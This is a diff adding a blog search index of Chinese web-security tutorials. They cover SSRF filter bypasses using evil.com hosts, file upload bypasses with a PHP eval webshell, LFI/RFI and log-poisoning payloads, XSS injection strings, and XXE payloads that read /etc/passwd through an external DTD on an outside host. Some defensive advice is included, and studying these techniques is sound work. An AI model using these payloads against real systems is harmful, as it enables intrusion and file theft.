@@ -1,9 +1,376 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[SSRF如何绕过filter_var和preg_match以及parse_url]]></title>
+    <url>%2F2018%2F05%2F30%2FSSRF%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87filter-var%E5%92%8Cpreg-match%E4%BB%A5%E5%8F%8Aparse-url%2F</url>
+    <content type="text"><![CDATA[0x01 前言这篇文章是在我看完一片国外安全大佬写的文章后对其进行总结并翻译得到的。 0x02 正文之绕过filter_var和preg_match本片文章主要深入一种php ssrf的技术——如何绕过例如filter_var(), preg_match()和parse_url()等函数。 本次我进行测试的php版本全部为php v5.6.30 PHP 漏洞代码12345678910111213141516171819202122232425&lt;?php echo &quot;Argument: &quot;.$argv[1].&quot;\n&quot;; //check if argument is a valid URL if(filter_var($argv[1], FILTER_VALIDATE_URL))&#123; //parse URL $r = parse_url($argv[1]); print_r($r); //check if host ends with google.com if(preg_match(&apos;/baidu\.com$/&apos;, $r[&apos;host&apos;]))&#123; //get page from URL exec(&apos;curl -v -s &quot;&apos;.$r[&apos;host&apos;].&apos;&quot;&apos;, $a); print_r($a); &#125;else&#123; echo &quot;Error: Host not allowed&quot;; &#125; &#125;else&#123; echo &quot;Error: Invalid URL&quot;; &#125;?&gt; 这段代码里使用了filter_var()函数，preg_match()函数来进行过滤，并用parse_url()函数进行解析，最后利用exec函数执行curl命令进行访问网址。 在正式介绍绕过技术之前，我们需要了解一下以上函数的具体作用。 filter_var()filter_var — 使用特定的过滤器过滤一个变量 preg_match()该函数使用正则表达式来进行匹配特定的字符串 parse_url() ok，了解了这些函数后，说说上面的测试代码。这段代码的是获取第一个参数（这个参数是用来模拟通过$_GET或者$_POST方法获取的），然后通过filter_var()函数判断传入的url时候符合规定。如果如何规定，通过parse_url来解析这个参数，获取到host值，通过preg_match函数来判断host时候以baidu.com结尾。 运行上面的代码得到的正常结果如下： 如果不是正常的参数呢？ 1http://evil.com 绕过FILTER_VALIDATE_URL和正则表达式许多URL结构保留一些特殊的字符用来表示特殊的含义，这些符号在URL中不同的位置有着其特殊的语义。字符“;”, “/”, “?”, “:”, “@”, “=” 和“&amp;”是被保留的。除了分层路径中的点段，通用语法将路径段视为不透明。 生成URI的应用程序通常使用段中允许的保留字符来分隔。例如“；”和“=”用来分割参数和参数值。逗号也有着类似的作用。 例如，有的结构使用name;v=1.1来表示name的version是1.1，然而还可以使用name,1.1来表示相同的意思。当然对于URL来说，这些保留的符号还是要看URL的算法来表示他们的作用。 例如，如果用于hostname上，URL1http://evil.com;baidu.com 会被curl或者wget这样的工具解析为host:evil.com，querything:baidu.com 运行代码试一下 发现报错了，返回的是Invalid URL，那么因该是filter_var函数没有绕过。filter_var函数可以解析多种协议，我们可以试一下不是http的协议，例如10://evil.com;baidu.com ok,成功绕过filter_var和preg_match函数！但是我们发现它并没有解析我们的url，别担心，我们试试添加一下端口号，因为不是http的话默认端口就不是80了10://evil.com:80;baidu.com:80 ok，成功解析！ 当然，我们之前说的逗号也是可以跟分号是一个作用的 依旧成功！ 0x03 正文之绕过parse_urlparse_url函数不是用来验证URL的正确性的，而是尽可能的去解析URL，并把URL分割成特定的部分。在这种情况下，可以使用将URL的部分变为变量从而进行绕过。10://evil$baidu.com 这里，在bash中，$var是一个变量，在这个例子中$baidu这个变量未定义是个空，也就是说这个URL是0://evil&lt;空&gt;.com，也就是0://evil.com，成功绕过！ 但是这种方法也是有局限性的，因为需要利用bash中的特性，因此只有在php脚本中使用exec()、system()等命令执行的函数执行curl或者wget命令时才可以完成。 0x04 正文之data://伪协议和xss利用与上面的exec不同，这里我们使用的是filter_get_content函数，php的测试代码如下： 12345678910111213141516171819&lt;?php echo &quot;Argument: &quot;.$argv[1].&quot;\n&quot;; // check if argument is a valid URL if(filter_var($argv[1], FILTER_VALIDATE_URL)) &#123; // parse URL $r = parse_url($argv[1]); print_r($r); // check if host ends with google.com if(preg_match(&apos;/baidu\.com$/&apos;, $r[&apos;host&apos;])) &#123; // get page from URL $a = file_get_contents($argv[1]); echo($a); &#125; else &#123; echo &quot;Error: Host not allowed&quot;; &#125; &#125; else &#123; echo &quot;Error: Invalid URL&quot;; &#125;?&gt; 这次我们的任务是在响应主体中修改内容，添加一个“Hacked by Pino_HD” 1data://text/plain;base64,SGFja2VkIGJ5IFBpbm8Kbaidu.com 发现parse_url函数把text设置成了host，然后报了Host not allowed错误。但是别担心，我们可以注入一些东西到MIME类型的地方，因为php是不关心MIME类型的。。 1data://baidu.com/plain;base64,SGFja2VkIGJ5IFBpbm8K ok，成功在响应包中写入我们想要写的东西。因此我们是可以控制响应体的内容，从而形成xss]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>SSRF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[如何提高盲注的效率]]></title>
+    <url>%2F2018%2F05%2F30%2F%E5%A6%82%E4%BD%95%E6%8F%90%E9%AB%98%E7%9B%B2%E6%B3%A8%E7%9A%84%E6%95%88%E7%8E%87%2F</url>
+    <content type="text"><![CDATA[0x01 SQL注入之盲注提到SQL注入，我想懂安全的小伙伴们应该都知道的，那么今天就来聊一聊关于如何提高盲注效率的问题。盲注的话大体上分为三类把。 布尔盲注 时间盲注 报错盲注 0x02 提高效率一般盲注提高效率的话有两点 减少查询次数 提高查询的正确性 那么第一种方法我想说的就是二分法 二分法的话，学过数据结构的人都懂的，答题思路我用如下python代码来做介绍： 123456def inject(a, list, start, end): if start == end: return list[start] if ord(a) &gt; list[(start+end)/2]: return inject(a, list, end/2, end) return inject(a, list, start, end/2) 这里我解释一下上述的代码。这里a是要查询的那一位字符，list是a-zA-Z0-9这种用来对比的字符串，start是开始，end是结束。进入函数，如果start等于end说明找到了，返回那个字符，如果a的ascii值大于list的中间字符的ascii，说明a的真正值在list的后半部分，因此start变为end／2；否则的话就是a的值在list的前半部分，因此end变成end／2 第二种方法就是位运算法 原理就是每次查询确定一位，这样一个字符只需要8次就可以确定了，利用位运算符&amp;，可以通过bin(ascii(‘a’))&amp;1,2,4,8,16…来获取8位二进制]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[命令执行时管道符和AND符的区别]]></title>
+    <url>%2F2018%2F05%2F30%2F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%B6%E7%AE%A1%E9%81%93%E7%AC%A6%E5%92%8CAND%E7%AC%A6%E7%9A%84%E5%8C%BA%E5%88%AB%2F</url>
+    <content type="text"><![CDATA[0x01 管道符管道符只能显示最后一个命令的正确输出结果，如图： 0x02 &amp;符号&amp;符号可以显示所有命令的正确输出结果 0x03 总结在命令执行的时候使用管道符不能看到中间命令的结果，因此需要视情况而定。]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>命令执行</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[.htaccess攻击]]></title>
+    <url>%2F2018%2F05%2F30%2Fhtaccess%E6%94%BB%E5%87%BB%2F</url>
+    <content type="text"><![CDATA[0x01 前言有的时候由于各种名单的原因，可能我们只能上传任何php文件，而且还没有其他地方来解析成php，咋办？如果你能上传.htaccess文件的话，那么就很好办了。 0x02 .htaccess攻击建一个.htaccess 文件，里面的内容如下：123&lt;FilesMatch &quot;pino&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 这个时候就上传一个文件名字是pino，这个时候我们上传一个文件名字叫做pino的文件，不要后缀名，然后里面是一句话木马，用菜刀连接，可以成功！]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[PHP文件上传漏洞]]></title>
+    <url>%2F2018%2F05%2F30%2FPHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2F</url>
+    <content type="text"><![CDATA[0x01 文件上传漏洞文件上传漏洞顾名思义就是用户上传一个可执行的脚本文件，获得了执行服务器端命令的能力。通常，文件上传是getshell最常用、最直接的方式了。但是，文件上传本身是一个正常的业务需求，因此问题在于如何安全的上传。 0x02 文件上传的触发条件 上传的文件被Web容器解释执行 用户能够从web页面访问到被上传的文件（直接或间接） 用户上传的文件通常不能被网站程序压缩、修改内容 0x03 从防御的角度看上传通常防御文件上传漏洞是分几个点的，大体上就以下几方面 1. 客户端javascript校验 在浏览加载文件，但还未点击上传按钮时变弹出对话框，内容可能是“只允许上传xxx后缀名的文件”之类的，而此时并没有发送数据包。 绕过方法： 关闭浏览器的javascript功能 用burp抓包改后缀名 2. 检测MIME 类型 · 客户端判断：1$_FILES[&apos;myfile&apos;][&apos;type&apos;] == &apos;image/jpeg&apos; · 服务端判断：12$fileinfo = finfo_open(FILEINFO_MIME);$mimetype = finfo_file($fileinfo, $file_true_name); 绕过方法： 用burp抓包，修改Content-Type 3. 检查内容 服务器端会读取上传的文件然后判断文件内容时候有&lt;?php之类的 绕过方法： 1. 12&lt;script language=&quot;php&quot;&gt;eval($_POST[&apos;cmd&apos;]);&lt;/script&gt;` 如果检查文件头的话就就可以找张真正的图片然后用winhex在图片的末尾写php代码 4. 检查文件扩展名 一般检查文件扩展名为最直接有效的方法，通常是基于白名单或者黑名单来实现的。 黑名单绕过 可以使用能够被解析的其他文件扩展名 1234jsp jspx jspfasp asa cer aspxphp phtml php3 php4 php5 PHP phtmexe exee 特殊文件名绕过比如在上传的时候改成test.asp.或者test.asp_(下划线为空格，这里方便大家看用下划线表示了)，这种命名方式在windows下是不允许的，绕过验证后windows系统自动去掉后面的点和空格，但要注意Unix/Linux是没有这个特性的。 00截断有的时候可能会遇到服务器端把后缀名已经定好了，而恰好别的地方有一个可以任意读取php文件的服务，这个时候可以把图片马上传后在这里查看，查看的时候用%00把后面的.php给截断就好了 .htaccess文件攻击配合名单列表绕过，上传一个自定义.htaccess文件，即可轻松绕过各种检测。 解析漏洞绕过这类漏洞直接配合上传一个代码注入过的非黑名单文件即可，再利用解析漏洞即可 白名单绕过 %00截断跟之前说的很像，就是上传一个比如shell.php%00.jpg，服务器检测后缀名是.jpg，但实际上已经被截断了。 解析漏洞利用这类漏洞直接配合上传一个代码注入过的白名单文件即可，再利用解析漏洞 .htaccess文件攻击配合名单列表绕过，上传一个自定义.htaccess文件，即可轻松绕过 0x04 与文件上传息息相关的解析漏洞 IIS5.x-6.x解析漏洞 •使用iis5.x-6.x版本的服务器，大多为windowsserver2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。 •目录解析(IIS6.0)，只要文件夹有asp的话，该目录下所有文件都会当作asp来解析1www.xxx.com/xx.asp/xx.jpg（xx.asp要存在） 1www.xxx.com/xx.asp;.jpg 服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。(xx.asp;.jpg为上传文件) IIS的PUT上传 PUT是在WebDav中定义的一个方法，允许用户上传文件到指定目录。在许多WebServer中都默认禁用了此方法，或者对上传做了严格限制。但在IIS中，如果目录支持写权限，同时开启了WebDav，就会支持PUT，再结合MOVE方法，可Getshell。 apache解析漏洞 Apache解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如test.php.owf.rar“.owf”和”.rar”这两种后缀是apache不可识别解析,apache就会把test.php.owf.rar解析成php 1www.xxxx.xxx.com/test.php.php123 Apache的httpd.conf的AddHandler php5-script .php这时只要文件名里包含.php即使文件名是test2.php.jpg也会以php来执行。（配置错误） nginx解析漏洞(Nginx&lt;8.03) •当cgi.fix_pathinfo开启时（为1） •当访问www.xx.com/phpinfo.jpg/1.php时，会将phpinfo.jpg当做php进行解析 •其中1.php是一个不存在的文件 0x05 参考 某大佬的PPT 文件上传框架]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>PHP</tag>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[PHP文件包含漏洞]]></title>
+    <url>%2F2018%2F05%2F30%2FPHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2F</url>
+    <content type="text"><![CDATA[0x01 文件包含函数 include() include_once() require() require_once() 这里include()函数如果在包含的过程中发生错误，会发出警告，但是会继续执行后续代码；require()函数如果在包含的过程中发生错误，会报错退出，并且不再执行之后的代码。include_once()和require_once()的功能跟include()和require()类似，只不过前者如果已经包含了文件，那么就不会包含第二次，以免出现函数重定义或变量重赋值的问题。 以上四个函数不管包含的文件类型是什么，都会当作php文件进行解析，例如phpinfo.txt12&lt;?phpphpinfo(); lfi.php1234&lt;?php$temp=$_GET[&apos;c&apos;];include($temp);?&gt; 成功执行phpinfo()！ 0x02 文件包含分类1. LFI（本地文件包含） 本地文件包含就是包含服务器本地的文件。 2. RFI（远程文件包含） 远程文件包含就是包含远程服务器上的文件，这样我们就可以自定义自己想要执行的代码，因此危害比较大。远程文件包含需要一定的条件php.ini配置12allow_url_fopen=On（默认开启）allow_url_include=On（默认关闭） 0x03 php伪协议假设服务器lfi.php内容如下1234&lt;?php$temp = $_GET[&apos;c&apos;];include($temp);?&gt; php://input 使用条件12allow_url_include=On（默认关闭）allow_url_fopen不做要求（默认开启） php://filter 使用条件：无 ··？c=php://filter/read=convert.base64-encode/resource=xxx或者?c=php://filter/convert.base64-encode/resource=xxx···通过指定resource的值来读取文件，读取的文件是base64加密后的，读取到后解一下就好了。 phar://* 使用条件：php版本大于等于5.3.0 假设需要读取的文件是phpinfo.txt，将其压缩成zip文件（phpinfo.zip） 然后指定文件的绝对路径1?c=phar://C://wamp64/www/phpinfo.zip/phpinfo.txt 或者使用相对路径（这里phpinfo.zip就在当前路径）1?c=phar://phpinfo.zip/phpinfo.txt zip:// 使用条件：php版本大于等于5.3.0 zip://与phar://的使用类似，但是需要绝对路径， zip文件后面要跟%23加zip文件里的文件 1?c=zip://C:/wamp64/www/phpinfo.zip%23phpinfo.txt data:URL schema 使用条件：php版本大于等于5.2.0allow_url_include=On(默认关闭)allow_url_fopen=On(默认开启) 1?c=data:text/plain,&lt;?php phpinfo();?&gt; 或者1?c=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b session文件包含 使用条件：session文件路径已知，并且内容部分可控 session文件路径可以在phpinfo中session.save_path得到 一般情况下session文件都在/tmp目录下命名格式：sess_[phpsessid]，而phpsessid可以在cookie中得到 要包含并利用的话，需要能控制部分sesssion文件的内容。暂时没有通用的办法。有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码。 包含日志文件 使用条件： 需要知道日志文件的目录，并且日志文件可读 当我们访问服务器的时候，访问的请求会被记录到access.log，当发生错误的时候会把错误写入到error.log，一般日志的路径linux下是/var/logs/apache2，windows下wamp在/wamp/logs但是如果我们直接请求的话，一些特殊字符会被url编码从而导致包含后无法解析 可以用burp抓包后改包即可。 之后就可以包含进行利用啦 包含ssh-log 使用条件：ssh日志路径已知，并且可读，默认情况下在/var/log/auth.log 1ssh &apos;&lt;?php phpinfo(); ?&gt;&apos;@remotehost 之后密码随便写之后包含日志文件就好啦 environ 使用条件： php以cgi方式运行，这样environ才会保持UA头。 environ文件存储位置已知，且environ文件可读。 proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。 条件竞争 0x04 绕过姿势指定前缀1234&lt;?php$file = $_GET[&apos;file&apos;];include &apos;/var/www/html/&apos;.$file;?&gt; 目录遍历 可以用../进行目录遍历，访问其他目录的文件 编码 但有的时候，服务器通常会把../过滤掉，这个时候可以用编码进行绕过利用url编码%2e%2e%5c..%5c%2e%2e\%2e%2e%2f..%2f%2e%2e/../..\ 二次编码%252e%252e%255c%252e%252e%252f../..\ 容器/服务器的编码方式../..%c0%af%c0%ae%c0%ae/注：Why does Directory traversal attack %C0%AF work? %c0%ae%c0%ae/注：java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）Apache Tomcat Directory Traversal..\..%c1%9c 指定后缀1234&lt;?php$file = $_GET[&apos;file&apos;];include $file.&apos;/test/test.php&apos;;?&gt; ?问号绕过1index.php?file=http://remoteaddr/remoteinfo.txt? 问号后面的部分/test/test.php，也就是指定的后缀被当作query从而被绕过。注意需要把#进行url编码为%23。 利用zip协议 可以构造跟后缀一样的路径，再打包成zip文件，然后利用zip协议包含即可]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>PHP</tag>
+        <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[XSS防御说]]></title>
+    <url>%2F2018%2F05%2F30%2FXSS%E9%98%B2%E5%BE%A1%E8%AF%B4%2F</url>
+    <content type="text"><![CDATA[0x01 HTTP响应的X-头部1. x-frame-options x-frame-options的值有两个： deny（禁止被加载到任何frame中） sameorigin（仅允许被加载进同域内的frame） 2. x-xss-protection x-xss-protection的值有三个： 0（表示禁用这个策略） 1（默认，对危险脚本做一些标志或修改，以阻止在浏览器上渲染执行，Chrome和IE在这方面的行为是有差异的） 1;mode=block（强制不渲染，在Chrome下直接跳转到空白页，在IE下返回一个#符号） 这个策略仅针对反射型xss，对付不了存储型xss，能识别反射型是因为提交请求的URL中带有可疑的xss代码片段。 3. x-content-security-policy（俗称CSP） CSP策略由一些指令构成，每个指令以分号分隔，语法格式：1x-content-security-policy:[指令1][指令值1];[指令2][指令值2]... 指令分类： defualt-src（以下值中的单引号必须有） 该指令的值会影响一下所有指令，支持通配符来表明外部资源的来源 &apos;none&apos;表示一个空集合，即表示外部资源不允许被加载 &apos;self&apos;表示匹配同域的资源，即只有同域内的资源允许被加载 &apos;unsafe-inline&apos;表示允许内核的javascript/css，如&lt;script&gt;里的，javascript:里的、on事件里的、&lt;style&gt;事件里的等。 &apos;unsafe-eval&apos;表示允许eval/setTimeout/setInterval/Function等可以直接执行字符串的函数。除此之外，还有一个data指令值，允许data:协议。 **注意以上指令值都以空格分隔** script-src 表示脚本的来源，指令值同default-src object-src 表示&lt;object&gt;&lt;embed&gt;&lt;applet&gt;等对象的来源，指令值同default-src img-src 表示&lt;img&gt;的来源，指令值同default-src media-src 表示&lt;audio&gt;&lt;vedio&gt;的来源，指令值同default-src frame-src 表示&lt;frame&gt;&lt;iframe&gt;的来源，指令值同default-src font-src 表示@font-face字体的来源，指令值同default-src connect-src 表示XMLHttpRequest、WebSocket等跨域的来源，指令值同default-src style-src 表示样本来源，指令值同default-src]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>XSS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[XSS输出点总结]]></title>
+    <url>%2F2018%2F05%2F30%2FXSS%E8%BE%93%E5%87%BA%E7%82%B9%E6%80%BB%E7%BB%93%2F</url>
+    <content type="text"><![CDATA[0x01 HTML标签之间例如输出点：1&lt;div id=&quot;body&quot;&gt;[输出]&lt;/div&gt; 直接提交1&lt;script&gt;alert(1)&lt;/script&gt; 即可触发XSS，但是当标签是不能执行脚本的标签 总结那么就得先把那个标签闭合，然后在注入XSS语句，例如1&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt; 0x02 HTML标签之内例如输入点：1&lt;input type=&quot;text&quot; value=&quot;[输出]&quot;/&gt; 两种方法： 闭合属性，然后用on时间来触发脚本 1&quot; onmouseover=alert(1) x=&quot; 闭合属性后闭合标签，然后直接执行脚本 1&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; 还有一些特殊的场景：1&lt;input type=&quot;hiden&quot; value=&quot;[输出]&quot; /&gt; 这里只能把input标签闭合，然后直接执行脚本，否则会因为type为hidden导致无法执行脚本1&lt;input value=&quot;[输出点]&quot; type=&quot;hidden&quot;/&gt; 但是这里可以输入11&quot; onmouseover=alert(1) type=&quot;text 输出变为1&lt;input value=&quot;1&quot; onmouseover=alert(1) type=&quot;text&quot; type=&quot;hidden&quot; /&gt; 这时候的输出就不再是隐藏表单了，而是标准输入框 再比如这两类场景： 输出在src/href/action等属性内，比如1&lt;a href=&quot;[输出]&quot;&gt;click me &lt;/a&gt; 除了各种闭合标签外，还可以12javascript:alert(1)//data:text/html;base64,(base64字符串) 前提是我们提交的payload必须出现在这些属性值的开头部分（data:协议的必须作为整个属性值出现，IE不支持） 对于javascript:alert(1)//来说，如果网站把注释符//过滤了，那么我们还可以用javascript逻辑与算数运算符，因为JavaScript是弱类型语言，字符串与字符串之间的各种运算是合法的，可以用12&lt;a href=&quot;javascript:alert(1) - html&quot;&gt;click me&lt;/a&gt;window.onerror=function()&#123;return true;&#125; //抑制错误 输出在on*事件内，比如1&lt;a href=&quot;#&quot; onclick=&quot;[输出]&quot;&gt;click me&lt;/a&gt; on*事件是可以执行javascript脚本的。 0x03 成为Javascript代码的值例如1&lt;script&gt;a=&quot;[输出]&quot;;...&lt;/script&gt; 此时我们可以闭合标签1&lt;/script&gt;&lt;script&gt;alert(1)// 也可以闭合a变量的值1&quot;;alert(1);// 0x04 成为CSS代码的值打开就是利用expression关键词来执行脚本]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>XSS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[转载-安全脉搏漏洞挖掘小记]]></title>
+    <url>%2F2018%2F05%2F30%2F%E8%BD%AC%E8%BD%BD-%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%B0%8F%E8%AE%B0%2F</url>
+    <content type="text"><![CDATA[0x01 前言 以前没有漏洞挖掘实践的经验，最近XMAN要求进行漏洞挖掘，所以遇到漏洞挖掘笔记还是要记录一下滴…没转载过，直接放链接好了http://byd.dropsec.xyz/2017/08/07/%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%B0%8F%E8%AE%B0/#more]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>SSRF</tag>
+        <tag>漏洞挖掘</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[XXE漏洞攻击与防御]]></title>
+    <url>%2F2018%2F05%2F30%2FXXE%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%2F</url>
+    <content type="text"><![CDATA[0x01 XML基础在聊XXE之前，先说说相关的XML知识吧。 定义XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。 文档结构XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。1234567891011121314151617&lt;!--XML声明--&gt;&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!--文档类型定义--&gt;&lt;!DOCTYPE note [ &lt;!--定义此文档是 note 类型的文档--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!--定义note元素有四个元素--&gt;&lt;!ELEMENT to (#PCDATA)&gt; &lt;!--定义to元素为”#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt; &lt;!--定义from元素为”#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt; &lt;!--定义head元素为”#PCDATA”类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt; &lt;!--定义body元素为”#PCDATA”类型--&gt;]]]&gt;&lt;!--文档元素--&gt;&lt;note&gt;&lt;to&gt;Dave&lt;/to&gt;&lt;from&gt;Tom&lt;/from&gt;&lt;head&gt;Reminder&lt;/head&gt;&lt;body&gt;You are a good man&lt;/body&gt;&lt;/note&gt; DTDXML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。内部声明DTD:1&lt;!DOCTYPE 根元素 [元素声明]&gt; 引用外部DTD:1&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt; DTD中的一些重要的关键字： DOCTYPE（DTD的声明） ENTITY（实体的声明） SYSTEM、PUBLIC（外部资源申请） 实体类别介绍实体主要分为一下四类 内置实体 (Built-in entities) 字符实体 (Character entities) 通用实体 (General entities) 参数实体 (Parameter entities) 参数实体用%实体名称申明，引用时也用%实体名称;其余实体直接用实体名称申明，引用时用&amp;实体名称。参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在xml文档中引用。 举例：内部实体1&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt; 外部实体1&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt; 参数实体123&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;或者&lt;!ENTITY % 实体名称 &quot;URI&quot;&gt; 注意：参数实体是在DTD中被引用的，而其余实体是在xml文档中被引用的。 外部实体默认协议 PHP扩展协议 举例：12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY passwd &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;foo&gt; &lt;value&gt;&amp;passwd;&lt;/value&gt;&lt;/foo&gt; 0x02 XXE漏洞XXE就是XML外部实体注入。当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。 举例 恶意引入外部实体(1) 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY passwd SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;a&gt; &lt;value&gt;&amp;passwd;&lt;/value&gt;&lt;/a&gt; 恶意引入外部实体(2) 1234567**XML内容**&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY % f SYSTEM &quot;http://www.m03.com/evil.dtd&quot;&gt; %d;]&gt;&lt;aaa&gt;&amp;b;&lt;/aaa&gt; DTD文件内容1&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt; 恶意引入外部实体(3) XML文件内容12345&lt;?xml verstion=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a[ &lt;!ENTITY f SYSTEM &quot;http://www.m03.com/evil.dtd&quot;&gt;]&gt;&lt;a&gt;&amp;b;&lt;/a&gt; DTD文件内容1&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt; XXE的危害 读取任意文件- 有回显 XML.php1234567891011&lt;?php $xml = &lt;&lt;&lt;EOF&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;x&gt;&amp;f;&lt;/x&gt;EOF;$data = simplexml_load_string($xml);print_r($data);?&gt; 访问XML.php可以读取etc/passwd文件内容 - 无回显 当页面没有回显的话，可以将文件内容发送到远程服务器，然后读取。12345678&lt;?xml verstion=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a[ &lt;!ENTITY % f SYSTEM &quot;http://www.m03.com/evil.dtd&quot;&gt; %f;]&gt;&lt;a&gt;&amp;b;&lt;/a&gt;$data = simplexml_load_string($xml);print_r($data); 远程服务器的evil.dtd文件内容1&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt; 命令执行 php环境下，xml命令执行要求php装有expect扩展。而该扩展默认没有安装。1234567891011&lt;?php $xml = &lt;&lt;&lt;EOF&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY f SYSTEM &quot;except://ls&quot;&gt;]&gt;&lt;x&gt;&amp;f;&lt;/x&gt;EOF;$data = simplexml_load_string($xml);print_r($data);?&gt; 内网探测/SSRF 由于xml实体注入攻击可以利用http://协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。 0x03 XXE漏洞修复与防御 使用开发语言提供的禁用外部实体的方法PHP1libxml_disable_entity_loader(true); JAVA12DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false); Python12from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 过滤用户提交的XML数据过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。 ##0x04 遗留问题(已解决) 以上测试在php5.4一下包括5.4是成功的，php5.5及以上是不成功的。可能的原因是5.5以上版本后，simplexml_load_string()、DOMDocument::loadxml()等不解析外部实体导致都不到文件还是因为libxml2版本的问题，还是高版本的php本身默认不解析外部实体呢，还是其他神恶魔原因呢？如果是因为php本身问题，那么XXE的利用范围也太过小了吧，应该不是这样的。。但是讲道理网上的资料太老了吧，估计也是参考别人的自己没有试验吧，等有空再做实验看看是什么问题。（2017.9.20更新）今天在弄phith0n的vulhub的时候，无意间看到php-xxe的项目，得到了我想要的结果。XXE的利用跟php版本没有关系，而是xmllib的版本问题，xmllib2.9.0以后，是默认不解析外部实体的。 ##0x05 参考文献 https://security.tencent.com/index.php/blog/msg/69http://php.yjsweb.cn/php/68075544811183197241.htmlhttps://thief.one/2017/06/20/1/]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>XXE</tag>
